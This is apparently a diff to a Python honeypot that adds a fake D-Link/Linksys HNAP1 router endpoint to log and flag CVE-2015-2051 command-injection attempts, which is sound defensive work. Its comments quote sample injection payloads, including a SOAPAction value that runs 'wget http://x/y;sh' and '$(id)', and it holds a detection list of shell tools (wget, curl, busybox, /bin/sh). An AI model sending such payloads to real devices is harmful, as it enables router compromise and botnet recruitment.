@@ -394,6 +394,64 @@ def _hikvision_has_cmdi(query: str, body_preview: str) -> bool:
     return any(needle in haystack for needle in _HIKVISION_CMDI_INDICATORS)
 
 
+# --- Fake D-Link / Linksys HNAP1 router endpoint (CVE-2015-2051 bait) ----
+# HNAP1 is the SOAP-over-HTTP control surface on a long tail of consumer
+# routers (D-Link DIR-*, Linksys WRT-*, Zyxel home gateways). It lives at
+# `/HNAP1` (root, no prefix) and accepts SOAP envelopes whose action URI
+# is named in the `SOAPAction` request header. Two scanner families churn
+# against this surface daily:
+#
+#   1. Mirai-style botnet workers shipping CVE-2015-2051 — command
+#      injection where the SOAPAction header value is concatenated into
+#      a shell command, e.g.
+#        SOAPAction: "http://purenetworks.com/HNAP1/`wget http://x/y;sh`"
+#      or
+#        SOAPAction: "http://purenetworks.com/HNAP1/$(id)"
+#      A bare 404 leaks "this isn't a router"; a plausible HNAP1 SOAP
+#      response with a vendor banner keeps the payload coming.
+#   2. Multi-target enterprise scanners that use `/HNAP1` as a router
+#      fingerprint before deciding which CVE to ship next.
+HNAP1_ENABLED = _env_bool("HONEYPOT_HNAP1_ENABLED")
+_HNAP1_DEFAULT_PATHS = ",".join([
+    "/hnap1",
+    "/hnap1/",
+])
+HNAP1_PATHS = {
+    value.strip().lower()
+    for value in (os.environ.get("HONEYPOT_HNAP1_PATHS_CSV") or _HNAP1_DEFAULT_PATHS).split(",")
+    if value.strip()
+}
+HNAP1_VENDOR = (os.environ.get("HONEYPOT_HNAP1_VENDOR") or "D-Link").strip()
+HNAP1_MODEL = (os.environ.get("HONEYPOT_HNAP1_MODEL") or "DIR-825").strip()
+# Firmware string in the disclosure window for CVE-2015-2051 / CVE-2019-6977
+# so scanners gating exploit delivery on a "vulnerable" banner don't bail.
+HNAP1_FIRMWARE_VERSION = (os.environ.get("HONEYPOT_HNAP1_FIRMWARE_VERSION") or "2.10NA").strip()
+
+# Shell-meta indicators flagged on the SOAPAction header / body / query.
+# CVE-2015-2051 ships the command directly inside the SOAPAction value
+# after the `/HNAP1/` segment, so backticks / $(/&&/;) in the header are
+# the highest-signal flag. Body indicators catch the wider Mirai dropper
+# repertoire (wget piped to sh, etc.).
+_HNAP1_CMDI_INDICATORS = (
+    "$(",
+    "`",
+    "&&",
+    "||",
+    ";",
+    "|",
+    "wget ",
+    "curl ",
+    "/bin/sh",
+    "tftp ",
+    "busybox",
+)
+
+
+def _hnap1_has_cmdi(soap_action: str, query: str, body_preview: str) -> bool:
+    haystack = f"{soap_action} {query} {body_preview}".lower()
+    return any(needle in haystack for needle in _HNAP1_CMDI_INDICATORS)
+
+
 # --- Fake GeoServer admin / OGC endpoints (CVE-2024-36401 bait) ----------
 # Two scanner families are observed probing this surface:
 #   1. Banner-grab fleets fetching /geoserver/, /geoserver/web/, /geoserver/index.html
@@ -727,6 +785,12 @@ def is_hikvision_path(path: str) -> bool:
     if not HIKVISION_ENABLED:
         return False
     return path.lower() in HIKVISION_PATHS
+
+
+def is_hnap1_path(path: str) -> bool:
+    if not HNAP1_ENABLED:
+        return False
+    return path.lower() in HNAP1_PATHS
 
 
 # OGNL / Java-runtime indicators surfaced when CVE-2024-36401 (or related
@@ -4788,6 +4852,115 @@ async def _handle_hikvision(
     )
 
 
+async def _handle_hnap1(
+    request: web.Request,
+    log_context: dict[str, object],
+    path: str,
+    query_string: str,
+    request_body: bytes,
+) -> web.Response:
+    """Fake D-Link / Linksys HNAP1 SOAP surface. GETs return a plausible
+    DeviceSettings envelope so banner-grab fleets keep coming back; the
+    SOAPAction header on POST/HEAD/GET is the highest-signal exploit
+    sink (CVE-2015-2051 ships the command directly inside the action
+    URI), so it gets logged and scanned for shell-meta indicators
+    alongside the body."""
+    method = request.method
+    soap_action = request.headers.get("SOAPAction", "") or request.headers.get("Soapaction", "")
+    soap_action_preview = soap_action[:512]
+
+    body_preview = ""
+    if request_body:
+        body_preview = request_body[:WEBSHELL_BODY_DECODE_LIMIT].decode("utf-8", errors="replace")
+
+    has_cmdi = _hnap1_has_cmdi(soap_action, query_string or "", body_preview)
+
+    if method == "POST":
+        # Generic SOAP "OK" envelope. Real HNAP1 endpoints respond with an
+        # action-specific element (e.g. <LoginResponse>); we use the action
+        # name from the header when present so the response shape tracks
+        # the request and scanners parsing the response don't bail.
+        action_name = ""
+        if "/HNAP1/" in soap_action:
+            tail = soap_action.split("/HNAP1/", 1)[1].strip().strip('"').strip("'")
+            # Strip any injected shell payload after the action name.
+            for sep in ("`", "$(", ";", "&", "|", " "):
+                if sep in tail:
+                    tail = tail.split(sep, 1)[0]
+            # SOAPAction values can be quoted; strip trailing quotes again.
+            tail = tail.strip('"').strip("'")
+            if tail and tail.replace("_", "").replace("-", "").isalnum():
+                action_name = tail
+        result_element = (action_name + "Response") if action_name else "HNAP1Response"
+        body = (
+            f'<?xml version="1.0" encoding="UTF-8"?>\n'
+            f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" '
+            f'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
+            f'xmlns:xsd="http://www.w3.org/2001/XMLSchema">\n'
+            f'<soap:Body>\n'
+            f'<{result_element} xmlns="http://purenetworks.com/HNAP1/">\n'
+            f'<{result_element}Result>OK</{result_element}Result>\n'
+            f'</{result_element}>\n'
+            f'</soap:Body>\n'
+            f'</soap:Envelope>\n'
+        ).encode("utf-8")
+        result_tag = "hnap1-soap-action"
+    else:
+        # GET / HEAD — return the device-discovery DeviceSettings envelope
+        # so single-fetch fingerprint scans see a plausible router banner.
+        body = (
+            f'<?xml version="1.0" encoding="UTF-8"?>\n'
+            f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" '
+            f'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
+            f'xmlns:xsd="http://www.w3.org/2001/XMLSchema">\n'
+            f'<soap:Body>\n'
+            f'<DeviceSettings xmlns="http://purenetworks.com/HNAP1/">\n'
+            f'<Type>GatewayWithWiFi</Type>\n'
+            f'<DeviceName>{HNAP1_MODEL}</DeviceName>\n'
+            f'<VendorName>{HNAP1_VENDOR}</VendorName>\n'
+            f'<ModelName>{HNAP1_MODEL}</ModelName>\n'
+            f'<ModelDescription>Wireless N Dual Band Gigabit Router</ModelDescription>\n'
+            f'<FirmwareVersion>{HNAP1_FIRMWARE_VERSION}</FirmwareVersion>\n'
+            f'<PresentationURL>http://192.168.0.1</PresentationURL>\n'
+            f'<SOAPActions>\n'
+            f'<string>http://purenetworks.com/HNAP1/GetDeviceSettings</string>\n'
+            f'<string>http://purenetworks.com/HNAP1/Login</string>\n'
+            f'<string>http://purenetworks.com/HNAP1/GetWLanRadios</string>\n'
+            f'</SOAPActions>\n'
+            f'</DeviceSettings>\n'
+            f'</soap:Body>\n'
+            f'</soap:Envelope>\n'
+        ).encode("utf-8")
+        result_tag = "hnap1-discovery"
+
+    log_entry = {
+        **log_context,
+        "status": 200,
+        "result": result_tag,
+        "hnap1Path": path,
+        "hnap1Method": method,
+        "hnap1HasCmdInjection": has_cmdi,
+        "bytes": len(body),
+    }
+    if soap_action_preview:
+        log_entry["hnap1SoapAction"] = soap_action_preview
+    if body_preview:
+        log_entry["bodyPreview"] = body_preview
+    append_log(log_entry)
+
+    return web.Response(
+        status=200, body=body,
+        headers={
+            "Content-Type": "text/xml; charset=utf-8",
+            # `Mathopd` is the embedded HTTP server that ships on most
+            # D-Link DIR-series firmware; matching this header keeps the
+            # fingerprint plausible for scanners that gate on it.
+            "Server": "Mathopd/1.5p6",
+            "Cache-Control": "no-store",
+        },
+    )
+
+
 async def _handle_geoserver(
     request: web.Request,
     log_context: dict[str, object],
@@ -5655,6 +5828,9 @@ async def handle(request: web.Request) -> web.StreamResponse:
     if is_hikvision_path(path):
         return await _handle_hikvision(request, log_context, path, query_string, request_body)
 
+    if is_hnap1_path(path):
+        return await _handle_hnap1(request, log_context, path, query_string, request_body)
+
     if is_geoserver_path(path):
         return await _handle_geoserver(request, log_context, path, request_body)
 
@@ -5748,6 +5924,8 @@ def main() -> int:
         active.append("aspera-faspex")
     if HIKVISION_ENABLED:
         active.append("hikvision")
+    if HNAP1_ENABLED:
+        active.append("hnap1-router")
     if GEOSERVER_ENABLED:
         active.append("geoserver")
     if COLDFUSION_ENABLED:
